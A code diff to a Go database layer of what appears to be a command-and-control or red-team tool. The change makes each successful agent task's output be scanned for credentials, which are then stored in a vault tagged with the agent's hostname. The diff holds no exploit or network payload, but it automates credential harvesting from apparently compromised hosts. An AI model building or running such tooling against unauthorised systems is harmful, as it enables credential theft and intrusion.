@@ -391,7 +391,16 @@ func (d *DB) InsertResult(taskID int64, agentID, output, errStr string) error {
 		status = "error"
 	}
 	_, err = d.db.Exec(`UPDATE tasks SET status = ? WHERE id = ?`, status, taskID)
-	return err
+	if err != nil {
+		return err
+	}
+
+	// Auto-parse credentials from successful task output (best-effort, never blocks).
+	if errStr == "" && output != "" {
+		go d.autoParseCredentials(taskID, agentID, output)
+	}
+
+	return nil
 }
 
 func (d *DB) GetResults(agentID string, limit int) ([]*Result, error) {
@@ -1226,4 +1235,29 @@ func (d *DB) ListCanaries() ([]map[string]any, error) {
 		out = append(out, m)
 	}
 	return out, nil
+}
+
+// ── auto credential parsing ───────────────────────────────────────────────────
+
+// autoParseCredentials runs the credential parser on a successful task result
+// and saves any found credentials to the vault. It is always called in a
+// goroutine and must never panic or block the caller.
+func (d *DB) autoParseCredentials(taskID int64, agentID, output string) {
+	// Look up task type and agent hostname — ignore errors, just skip.
+	var taskType string
+	d.db.QueryRow(`SELECT type FROM tasks WHERE id = ?`, taskID).Scan(&taskType)
+
+	var hostname string
+	d.db.QueryRow(`SELECT hostname FROM agents WHERE id = ?`, agentID).Scan(&hostname)
+
+	source := "auto"
+	if taskType != "" {
+		source = "auto:" + taskType
+	}
+
+	creds := ParseCreds(output)
+	for _, c := range creds {
+		// best-effort — ignore individual insert errors
+		d.AddCred(c.credType, c.domain, c.username, c.secret, hostname, source, "auto") //nolint:errcheck
+	}
 }
